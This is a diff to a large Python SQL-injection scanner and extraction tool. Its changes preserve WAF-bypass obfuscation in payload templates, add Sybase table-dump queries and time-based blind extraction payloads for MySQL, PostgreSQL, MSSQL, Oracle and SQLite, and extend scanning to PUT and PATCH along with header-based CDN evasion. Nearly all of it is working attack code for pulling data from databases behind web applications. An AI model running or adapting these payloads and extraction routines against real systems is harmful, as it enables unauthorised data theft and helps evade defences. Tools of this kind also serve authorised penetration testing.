@@ -43861,8 +43861,13 @@ def build_extraction_payload_from_confirmed(
     # from_confirmed doesn't receive the DBMS directly; callers that know the DBMS
     # should pass it via the new optional `dbms` kwarg added below.
     _p = unquote(unquote(exact_sent_payload))
-    _p = _re.sub(r'/\*[^*]*\*/', ' ', _p)  # BUG-FIX-1C: __re was undefined
-    _p = _re.sub(r'  +', ' ', _p).strip()
+    # BUG-COMMENT-STRIP-BREAKS-CONCAT-OP FIX: Do NOT strip inline SQL comments here.
+    # Stripping /\*[^*]*\*/ from |/*Y9Z*/| produces "| |" — the PostgreSQL ||
+    # concatenation operator requires no whitespace between pipes; "| |" is a syntax
+    # error.  The original stripping was added to help regex matching of tautology
+    # patterns like 1=1, but the flexible CASE WHEN regex below handles obfuscated
+    # CASE/*x*/WHEN without requiring stripping.  Preserve the full payload structure
+    # so every returned extraction template contains valid SQL.
     # BUG-3 FIX: Replace 0x hex integer literals with their decimal equivalents for
     # PostgreSQL and Oracle targets.  During scanning, numericobfuscate (Phase 6b of
     # _build_rotating_tamper_chain, 30% probability) can convert integer literals such
@@ -43899,6 +43904,20 @@ def build_extraction_payload_from_confirmed(
         return (_body[:_cp.start()] + (_cp.group(1) or '') +
                 new_expression + (_cp.group(3) or '') +
                 _body[_cp.end():] + _sfx)
+
+    # CASE WHEN condition replacement: handles ARRAY_LOWER(...)!~~LN(2.718),
+    # ARRAY_LOWER(...)~~LN(2.718), and any other complex WHEN conditions that
+    # the _cp regex cannot match (e.g. NOT ILIKE / ILIKE operators).
+    # Flexible regex: allows 0+ inline SQL comments (each /*...*/ optionally followed
+    # by whitespace) between CASE and WHEN, and between WHEN and the condition.
+    # This handles payloads like "cASE/*to*//*iN*/WHEN ARRAY_LOWER(...)..." without
+    # requiring comment stripping (which would break the || concatenation operator).
+    _cw_ext_m = _re.search(
+        r'\bCASE\s*(?:/\*[^*]*\*/\s*)*WHEN\s*(?:/\*[^*]*\*/\s*)*(.+?)\s+THEN\b',
+        _body, _re.I | _re.DOTALL)
+    if _cw_ext_m:
+        return (_body[:_cw_ext_m.start(1)] + new_expression +
+                _body[_cw_ext_m.end(1):] + _sfx)
 
     # No static condition found — find AND keyword and insert after it.
     # Support both leading-AND payloads ("AND ...") and mid-payload ("' AND ...").
@@ -54809,9 +54828,34 @@ class Scanner:
                         _template = _body[:_cw_bs] + "[INFERENCE]" + _body[_cw_be:]
                         LOG.info("[Inference] Template (boolean-CASE-WHEN-replace): %s", _template[:80])
                     else:
-                        # No static condition found and not stacked — append AND as last resort
-                        _template = _body + " AND [INFERENCE]"
-                        LOG.info("[Inference] Template (boolean-append): %s", _template[:80])
+                        # URL-decode fallback: exact_sent_payload may have URL-encoded
+                        # keyword chars (e.g. c%61%53%45 = cASE, W%68EN = WHEN) and
+                        # inline SQL comments between keywords (e.g. cASE/*x*//*y*/WHEN).
+                        # Strategy: URL-decode only (do NOT strip comments — stripping
+                        # |/*y*/| gives "| |" which breaks the PostgreSQL || operator).
+                        # Use a flexible regex that matches CASE...WHEN through intervening
+                        # inline comments so the full bypass structure is preserved in the
+                        # template.
+                        _cwb_m2 = None
+                        _body_dec_ie = _body
+                        try:
+                            _body_dec_ie = unquote(_body)
+                            # Flexible CASE WHEN regex: allows 0+ inline comments/spaces
+                            # between CASE and WHEN keywords.
+                            _cwb_m2 = _re.search(
+                                r'\bCASE\s*(?:/\*[^*]*\*/\s*)*WHEN\s+(.+?)\s+THEN\b',
+                                _body_dec_ie, _re.I | _re.DOTALL)
+                        except Exception:
+                            pass
+                        if _cwb_m2:
+                            _template = (_body_dec_ie[:_cwb_m2.start(1)] +
+                                         "[INFERENCE]" +
+                                         _body_dec_ie[_cwb_m2.end(1):])
+                            LOG.info("[Inference] Template (boolean-CASE-WHEN-decoded): %s", _template[:80])
+                        else:
+                            # No static condition found and not stacked — append AND as last resort
+                            _template = _body + " AND [INFERENCE]"
+                            LOG.info("[Inference] Template (boolean-append): %s", _template[:80])
 
         # FIX: Strip WAF-blocked '>0' suffix from generate_series/count(*) subqueries.
         # HQ detection payloads end with '))>0' — the WAF blocks the '>' operator at the
@@ -63472,7 +63516,7 @@ class Scanner:
         # FIX ROOT CAUSE #3: Add dedicated TIME-BASED extraction (T/TH techniques)
         # The _time_based_extract function exists but was never called from enumeration.
         # Wire it here to use timing-based binary search oracle for T/TH/HQ techniques.
-        if enum.result.technique in ("T", "TH", "HQ"):
+        if enum.result.technique in ("T", "TH", "HQ", "BT"):
             LOG.info("[TimeBasedExtract] Time-based detection - using dedicated extraction")
             try:
                 # BUG-V62-TIMEBASED-MYSQL-SQL FIX (Req 7/8/10/16):
@@ -83303,6 +83347,25 @@ def _build_det_template(result) -> str:
     if _cw_m:
         LOG.debug("[Template] CASE-WHEN-BOOL fallback: replacing condition between WHEN and THEN")
         return (_body[:_cw_m.start(1)] + '[INFERENCE]' + _body[_cw_m.end(1):] + _sfx)
+    # URL-decode fallback: exact_sent_payload may have URL-encoded keyword chars
+    # (e.g. c%61%53%45 = cASE, W%68EN = WHEN) and inline SQL comments between
+    # keywords (e.g. cASE/*x*//*y*/WHEN). Strategy: URL-decode only (do NOT strip
+    # comments — stripping |/*y*/| gives "| |" which breaks the PostgreSQL ||
+    # concatenation operator). Use a flexible regex that matches CASE...WHEN
+    # through intervening inline comments so the full bypass structure is preserved.
+    if _exact_det:
+        try:
+            _body_dec = unquote(_body)
+            # Flexible CASE WHEN regex: allows 0+ inline comments/spaces between keywords.
+            _cw_m2 = _re.search(
+                r'\bCASE\s*(?:/\*[^*]*\*/\s*)*WHEN\s+(.+?)\s+THEN\b',
+                _body_dec, _re.I | _re.DOTALL)
+            if _cw_m2:
+                LOG.debug("[Template] CASE-WHEN-BOOL URL-decoded fallback")
+                return (_body_dec[:_cw_m2.start(1)] + '[INFERENCE]' +
+                        _body_dec[_cw_m2.end(1):] + _sfx)
+        except Exception:
+            pass
     # return empty string instead of the broken fallback `_body + ' AND [INFERENCE]'`.
     # The broken fallback produces invalid SQL for:
     #   - MSSQL WAITFOR DELAY: "; WAITFOR DELAY '0:0:3' AND [INFERENCE]-- -" (T-SQL error)
@@ -88311,6 +88374,22 @@ class GroupConcatExtractor:
             subq  = (f"(SELECT group_concat(t,{_row_s}) FROM "
                      f"(SELECT {concat_row} AS t FROM "
                      f"\"{table}\" LIMIT {limit}) _gc_inner)")
+        elif _dbms == "Sybase":
+            # BUG-SYBASE-EXTRACT-TABLE-FIX: Sybase ASE has no GROUP_CONCAT (MySQL-only).
+            # Sybase 15.7+ supports STRING_AGG with VARCHAR(MAX) (not NVARCHAR which is
+            # SQL Server specific). On older Sybase (pre-15.7) STRING_AGG is unavailable
+            # and the UNION probe fails, causing the orchestrator to fall back to blind
+            # extraction engines (unaffected). Using VARCHAR(MAX) consistent with
+            # the _chr_wrap fix for Sybase at line ~88538.
+            _q     = lambda c: f"[{c}]"
+            _nl    = lambda e: f"ISNULL(CAST({e} AS VARCHAR(MAX)),'NULL')"
+            _sep_s = f"'{self.COL_SEP}'"
+            _row_s = f"'{self.ROW_SEP}'"
+            col_exprs  = [_nl(_q(c)) for c in cols]
+            concat_row = (" + " + _sep_s + " + ").join(col_exprs)
+            subq  = (f"(SELECT STRING_AGG(CAST(t AS VARCHAR(MAX)),{_row_s}) "
+                     f"FROM (SELECT TOP {limit} {concat_row} AS t "
+                     f"FROM [{db}]..[{table}]) _gc_inner)")
         else:
             # MySQL / MariaDB / Generic (original code path, known-working)
             _q     = lambda c: f"`{c}`"
@@ -89539,25 +89618,36 @@ class ScannerV10(ScannerV9):
             # which re-sends the ACTUAL detection payload and checks for the error pattern.
             _pcv_has_error_payload = False
             if _det_payload_upper and not _pcv_has_timing_payload:
+                # BUG-ERROR-KW-COMMENT-STRIP FIX: Use comment-stripped payload for
+                # keyword detection so WAF-bypass mutations that fragment keywords
+                # (e.g. EXTRACTV/*x*/ALUE → EXTRACTVALUE after strip) are matched.
+                # This does NOT affect _det_payload_upper itself (used later for
+                # UNION/SLEEP routing) — only the local error-routing decision.
+                try:
+                    _det_pay_for_err_check = _re.sub(
+                        r'/\*[^*]*\*+(?:[^*/][^*]*\*+)*/', '', _det_payload_upper)
+                    _det_pay_for_err_check = _re.sub(r'\s+', ' ', _det_pay_for_err_check).strip()
+                except Exception:
+                    _det_pay_for_err_check = _det_payload_upper
                 _pcv_error_kw_check = (
-                    'UPDATEXML(' in _det_payload_upper or
-                    'EXTRACTVALUE(' in _det_payload_upper or
-                    'CONVERT(INT,' in _det_payload_upper or
-                    'CONVERT(INT ,' in _det_payload_upper or
-                    'CAST(1/0' in _det_payload_upper or
-                    'XMLPARSE(' in _det_payload_upper or
-                    'XMLDOM(' in _det_payload_upper or
+                    'UPDATEXML(' in _det_pay_for_err_check or
+                    'EXTRACTVALUE(' in _det_pay_for_err_check or
+                    'CONVERT(INT,' in _det_pay_for_err_check or
+                    'CONVERT(INT ,' in _det_pay_for_err_check or
+                    'CAST(1/0' in _det_pay_for_err_check or
+                    'XMLPARSE(' in _det_pay_for_err_check or
+                    'XMLDOM(' in _det_pay_for_err_check or
                     # MSSQL/Oracle error-based functions
-                    'CTXSYS.DRITHSX.SN(' in _det_payload_upper or
-                    'UTL_HTTP.' in _det_payload_upper or
-                    'DBMS_XMLGEN.GETXML(' in _det_payload_upper or
+                    'CTXSYS.DRITHSX.SN(' in _det_pay_for_err_check or
+                    'UTL_HTTP.' in _det_pay_for_err_check or
+                    'DBMS_XMLGEN.GETXML(' in _det_pay_for_err_check or
                     # MySQL error-based
-                    'GEOMETRYCOLLECTION(' in _det_payload_upper or
-                    'MULTIPOLYGON((' in _det_payload_upper or
-                    'LINESTRING(' in _det_payload_upper and 'SELECT' in _det_payload_upper or
-                    'POLYGON((' in _det_payload_upper and 'SELECT' in _det_payload_upper or
-                    'GTID_SUBSET(' in _det_payload_upper or
-                    'FLOOR(RAND(' in _det_payload_upper or
+                    'GEOMETRYCOLLECTION(' in _det_pay_for_err_check or
+                    'MULTIPOLYGON((' in _det_pay_for_err_check or
+                    ('LINESTRING(' in _det_pay_for_err_check and 'SELECT' in _det_pay_for_err_check) or
+                    ('POLYGON((' in _det_pay_for_err_check and 'SELECT' in _det_pay_for_err_check) or
+                    'GTID_SUBSET(' in _det_pay_for_err_check or
+                    'FLOOR(RAND(' in _det_pay_for_err_check or
                     # BUG-V194-B FIX: Oracle-specific error-based payload patterns.
                     # ORACLE_ERROR_PAYLOADS uses these techniques extensively to trigger
                     # type-coercion errors (ORA-01722 invalid number, ORA-00932 inconsistent
@@ -89568,16 +89658,16 @@ class ScannerV10(ScannerV9):
                     #
                     # TO_NUMBER(user_data): triggers ORA-01722 "invalid number" when non-numeric
                     # data is coerced → canonical Oracle error-based extraction technique.
-                    'TO_NUMBER(' in _det_payload_upper or
+                    'TO_NUMBER(' in _det_pay_for_err_check or
                     # XMLELEMENT(name tag,...): triggers ORA-00932 "inconsistent datatypes:
                     # expected - got XML" when the result is used in a numeric context.
-                    'XMLELEMENT(' in _det_payload_upper or
+                    'XMLELEMENT(' in _det_pay_for_err_check or
                     # XMLATTRIBUTES(...): same ORA-00932 mechanism as XMLELEMENT.
-                    'XMLATTRIBUTES(' in _det_payload_upper or
+                    'XMLATTRIBUTES(' in _det_pay_for_err_check or
                     # CAST(x AS NUMBER(...)): triggers ORA-01722 for non-numeric columns.
-                    ('AS NUMBER(' in _det_payload_upper and 'CAST(' in _det_payload_upper) or
+                    ('AS NUMBER(' in _det_pay_for_err_check and 'CAST(' in _det_pay_for_err_check) or
                     # DBMS_SESSION.UNIQUE_SESSION_ID coerced to NUMBER: ORA-01722 mechanism.
-                    'DBMS_SESSION.UNIQUE_SESSION_ID' in _det_payload_upper
+                    'DBMS_SESSION.UNIQUE_SESSION_ID' in _det_pay_for_err_check
                 )
                 _pcv_has_error_payload = _pcv_error_kw_check
             _pcv_route_to_inline = (
@@ -89592,7 +89682,7 @@ class ScannerV10(ScannerV9):
                 # BUG-NV-WB-EX-HY-ST-ERROR-PCV FIX: NV/WB/EX/HY/ST payloads with error
                 # expressions must also use _inline_pcv_check (E-path).
                 # Check A body-canary cannot reproduce error-based detections.
-                (_pcv_tech in ("NV", "WB", "EX", "HY", "ST")
+                (_pcv_tech in ("NV", "WB", "EX", "HY", "ST", "B", "BH")
                  and _pcv_has_error_payload)
             )
             if _pcv_route_to_inline:
@@ -121181,12 +121271,13 @@ class UniversalScanOrchestrator:
                                                     "SQLite":          "MIN(2e0,3e0)>(0e0)",
                                                 }.get(_ibo_pol_dbms, "1e0<2e0")
                                                 if _bool_tmpl:
-                                                    _cal_pay = _bool_tmpl.replace('[INFERENCE]', _ibo_pol_true)
+                                                    # BUG-DOUBLE-PREFIX-IBO-POL FIX: template already has original prefix
+                                                    _cal_full_ibo = _bool_tmpl.replace('[INFERENCE]', _ibo_pol_true)
                                                 else:
-                                                    _cal_pay = f" AND ({_ibo_pol_true})-- -"
+                                                    _cal_full_ibo = _det_orig + f" AND ({_ibo_pol_true})-- -"
                                                 _cal_fp = await asyncio.wait_for(
                                                     _send_injected(_scanner_ref.engine, method, url, data, data_fmt,
-                                                                   _det_param, _det_orig + _cal_pay, _det_tamper),
+                                                                   _det_param, _cal_full_ibo, _det_tamper),
                                                     timeout=10)
                                                 if _cal_fp and _validate_response(_cal_fp, allow_empty=True):
                                                     _cal_norm = ResponseNormaliser.normalise(_extract_body_safe(_cal_fp))
@@ -121212,10 +121303,15 @@ class UniversalScanOrchestrator:
                                                 try:
                                                     # BUG-INLINE-BOOL-ORACLE FIX: Use detection template
                                                     # if available; fall back to bare AND construct.
+                                                    # BUG-DOUBLE-PREFIX-IBO FIX: template built from
+                                                    # exact_sent_payload already includes the original
+                                                    # parameter prefix — send _pay directly in template path.
                                                     if _tmpl:
                                                         _pay = _tmpl.replace('[INFERENCE]', _cond)
+                                                        _ibo_use_prefix = False
                                                     else:
                                                         _pay = f" AND ({_cond})-- -"
+                                                        _ibo_use_prefix = True
                                                     # BUG-INLINE-BOOL-ORACLE-HEAVY-OBFUS FIX (HIGH):
                                                     # Upgrade to apply_heavy_variation + _obfuscate_extraction_cond
                                                     # for full structural diversity and function-name obfuscation.
@@ -121241,8 +121337,9 @@ class UniversalScanOrchestrator:
                                                         "Pragma": "no-cache",
                                                         "Accept-Language": f"en-US,en;q=0.{_cb_ibo % 9000 + 1000}",
                                                     }
+                                                    _ibo_full = (_o + _pay) if _ibo_use_prefix else _pay
                                                     _fp_b = await asyncio.wait_for(
-                                                        _send_injected(_e, _m, _cb_u_ibo, _d, _df, _p, _o + _pay, _tc,
+                                                        _send_injected(_e, _m, _cb_u_ibo, _d, _df, _p, _ibo_full, _tc,
                                                                        extra_headers=_cdn_hdrs_ibo),
                                                         timeout=10)
                                                     if _fp_b is None:
@@ -121773,7 +121870,7 @@ class UniversalScanOrchestrator:
                                                                 "Accept-Language": f"en-US,en;q=0.{_cb_iuo % 9000 + 1000}",
                                                             }
                                                             _fp_u = await asyncio.wait_for(
-                                                                _send_injected(_e, _m, _cb_u_iuo, _d, _df, _p, _o + _pay, _tc,
+                                                                _send_injected(_e, _m, _cb_u_iuo, _d, _df, _p, _pay, _tc,
                                                                                extra_headers=_cdn_hdrs_iuo),
                                                                 timeout=15)
                                                         else:
@@ -122143,13 +122240,21 @@ class UniversalScanOrchestrator:
                                                             "Oracle":          "NVL(NULL,1e0)<(0e0)",
                                                             "SQLite":          "MIN(2e0,3e0)<(0e0)",
                                                         }.get(_wb_cal_dbms, "2e0<1e0")
-                                                        # TRUE probe
+                                                        # TRUE probe — obfuscate calibration conditions so
+                                                        # WAF-bypass case-mixing applies (same as extraction).
+                                                        _wb_cal_true_obf = _obfuscate_extraction_cond(_wb_cal_true, 0)
+                                                        _wb_cal_false_obf = _obfuscate_extraction_cond(_wb_cal_false, 1)
                                                         if _wb_tmpl_early:
-                                                            _ibw_sc_t = _det_orig + _wb_tmpl_early.replace('[INFERENCE]', _wb_cal_true)
-                                                            _ibw_sc_f = _det_orig + _wb_tmpl_early.replace('[INFERENCE]', _wb_cal_false)
+                                                            # BUG-DOUBLE-PREFIX-CAL FIX: _wb_tmpl_early is built
+                                                            # from exact_sent_payload which already includes the
+                                                            # original prefix. Adding _det_orig creates double prefix.
+                                                            _ibw_sc_t = apply_heavy_variation(
+                                                                _wb_tmpl_early.replace('[INFERENCE]', _wb_cal_true_obf), 0)
+                                                            _ibw_sc_f = apply_heavy_variation(
+                                                                _wb_tmpl_early.replace('[INFERENCE]', _wb_cal_false_obf), 1)
                                                         else:
-                                                            _ibw_sc_t = f"{_det_orig}{_wb_ipfx_early} AND ({_wb_cal_true})-- -"
-                                                            _ibw_sc_f = f"{_det_orig}{_wb_ipfx_early} AND ({_wb_cal_false})-- -"
+                                                            _ibw_sc_t = f"{_det_orig}{_wb_ipfx_early} AND ({_wb_cal_true_obf})-- -"
+                                                            _ibw_sc_f = f"{_det_orig}{_wb_ipfx_early} AND ({_wb_cal_false_obf})-- -"
                                                         _ibw_sc_fp_t = await asyncio.wait_for(
                                                             _send_injected(_scanner_ref.engine, method, url, data, data_fmt,
                                                                            _det_param, _ibw_sc_t, _det_tamper), timeout=10)
@@ -122276,8 +122381,9 @@ class UniversalScanOrchestrator:
                                                         "SQLite":          "MIN(2e0,3e0)>(0e0)",
                                                     }.get(_ibw_pol_dbms, "1e0<2e0")
                                                     if _wb_tmpl:
+                                                        # BUG-DOUBLE-PREFIX-POL FIX: template already has prefix
                                                         _ibw_cal_pay = _wb_tmpl.replace('[INFERENCE]', _ibw_pol_true)
-                                                        _ibw_cal_full = _det_orig + _ibw_cal_pay
+                                                        _ibw_cal_full = _ibw_cal_pay
                                                     else:
                                                         _ibw_cal_full = f"{_det_orig}{_wb_inj_pfx} AND ({_ibw_pol_true})-- -"
                                                     _ibw_cal_fp = await asyncio.wait_for(
@@ -122353,8 +122459,13 @@ class UniversalScanOrchestrator:
                                                                 "Pragma": "no-cache",
                                                                 "Accept-Language": f"en-US,en;q=0.{_cb_ibwt % 9000 + 1000}",
                                                             }
+                                                            # BUG-DOUBLE-PREFIX FIX: _wb_tmpl is built from
+                                                            # exact_sent_payload which ALREADY includes the
+                                                            # original parameter value as prefix. Adding _o
+                                                            # again produces "FrFr||..." double prefix.
+                                                            # Template path: send _pay directly (full value).
                                                             _fp_wb = await asyncio.wait_for(
-                                                                _send_injected(_e, _m, _cb_u_ibwt, _d, _df, _p, _o + _pay, _tc,
+                                                                _send_injected(_e, _m, _cb_u_ibwt, _d, _df, _p, _pay, _tc,
                                                                                extra_headers=_cdn_hdrs_ibwt),
                                                                 timeout=10)
                                                         else:
@@ -122454,9 +122565,54 @@ class UniversalScanOrchestrator:
                                                             _bl=_bl_mean_st,
                                                             _db=_confirmed_dbms,
                                                             _rc=_sto_req_count,
-                                                            _ipfx=_st_inj_pfx):
+                                                            _ipfx=_st_inj_pfx,
+                                                            _tmpl=_wb_tmpl):
                                                         try:
-                                                            if _db in ('MySQL', 'MariaDB', 'TiDB'):
+                                                            # BUG-TIMING-ORACLE-STYLE FIX: Detection may use
+                                                            # ||CASE WHEN style (concatenation injection) while
+                                                            # the AND-style payloads below assume numeric/AND
+                                                            # context. When a template is available (built from
+                                                            # exact_sent_payload preserving detection structure),
+                                                            # embed the timing condition into [INFERENCE] slot.
+                                                            # Template already includes original prefix — send
+                                                            # directly without _o prefix (double-prefix fix).
+                                                            if _tmpl:
+                                                                if _db in ('MySQL', 'MariaDB', 'TiDB'):
+                                                                    _timing_inner = (
+                                                                        f"(SELECT count(*) FROM "
+                                                                        f"information_schema.tables a,"
+                                                                        f"information_schema.tables b "
+                                                                        f"WHERE ({_cond})) IS NOT NULL")
+                                                                elif _db in ('PostgreSQL', 'CockroachDB',
+                                                                             'YugabyteDB', 'Amazon Redshift'):
+                                                                    _hq_rows_st = max(1000000, min(int(_ts * 1000000), 8000000))
+                                                                    _timing_inner = (
+                                                                        f"(SELECT count(*) FROM "
+                                                                        f"generate_series(1,CASE WHEN ({_cond}) "
+                                                                        f"THEN {_hq_rows_st} ELSE 1 END)) IS NOT NULL")
+                                                                elif _db in ('MSSQL', 'Sybase'):
+                                                                    _timing_inner = (
+                                                                        f"(SELECT CASE WHEN ({_cond}) "
+                                                                        "THEN (SELECT COUNT(*) FROM sys.all_columns A "
+                                                                        "CROSS JOIN (SELECT TOP 100 object_id FROM "
+                                                                        "sys.all_columns) B WHERE A.object_id IS NOT NULL) "
+                                                                        "ELSE CAST(0 AS INT) END) IS NOT NULL")
+                                                                elif _db == 'Oracle':
+                                                                    _timing_inner = (
+                                                                        f"(SELECT CASE WHEN ({_cond}) "
+                                                                        "THEN (SELECT COUNT(*) FROM all_objects A, "
+                                                                        "all_objects B WHERE ROWNUM<500000) "
+                                                                        "ELSE 0 END FROM DUAL) IS NOT NULL")
+                                                                elif _db == 'SQLite':
+                                                                    _iters_st = min(int(_ts * 1_000_000), 4_000_000)
+                                                                    _timing_inner = (
+                                                                        f"CASE WHEN ({_cond}) "
+                                                                        f"THEN LIKE('X',HEX(RANDOMBLOB({_iters_st}))) "
+                                                                        "ELSE 1=1 END")
+                                                                else:
+                                                                    _timing_inner = _cond
+                                                                _pay = _tmpl.replace('[INFERENCE]', _timing_inner)
+                                                            elif _db in ('MySQL', 'MariaDB', 'TiDB'):
                                                                 _pay = (f"{_o}{_ipfx} AND (SELECT count(*) FROM "
                                                                         f"information_schema.tables a,"
                                                                         f"information_schema.tables b "
@@ -123142,7 +123298,7 @@ class ScannerV13(ScannerV12):
                             return []
                     
                     _bg_surface_tasks.append(asyncio.create_task(_bg_header_scan()))
-                    for _bgm in [m for m in ("POST",) if m != ep.method.upper()]:
+                    for _bgm in [m for m in ("POST", "PUT", "PATCH") if m != ep.method.upper()]:
                         _bg_surface_tasks.append(asyncio.create_task(_bg_method_scan(_bgm)))
                 
                 # Primary scan (runs concurrently with background tasks)
@@ -169705,6 +169861,7 @@ class ScannerVFinal(ScannerV15):
             _BOOL_CALIBRATOR_MODULE.true_sims.clear()
             _BOOL_CALIBRATOR_MODULE.false_sims.clear()
             _BOOL_CALIBRATOR_MODULE.threshold = 0.65
+            _BOOL_CALIBRATOR_MODULE._polarity_inverted = False
         except Exception:
             pass
 
